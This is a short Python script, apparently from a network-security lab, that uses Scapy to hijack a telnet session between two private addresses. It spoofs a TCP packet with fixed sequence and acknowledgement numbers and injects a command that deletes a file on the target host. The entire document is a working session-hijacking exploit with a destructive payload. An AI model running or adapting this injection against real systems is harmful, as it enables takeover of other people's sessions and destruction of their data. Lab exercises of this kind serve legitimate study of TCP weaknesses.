#!use/bin/python3
from scapy.all import *
import sys

s_port = 50994
sequence = 4260769035
acknolegment = 815922813

print("Sending Session Hijacking Packet..")
ip = IP(src='10.0.2.8',dst='10.0.2.9')
tcp = TCP(sport=s_port,dport=23,flags="A",seq=sequence,ack=acknolegment)
payload = "\rrm textfile.txt\r"
pkt=ip/tcp/payload
pkt.show()
send(pkt,verbose=0)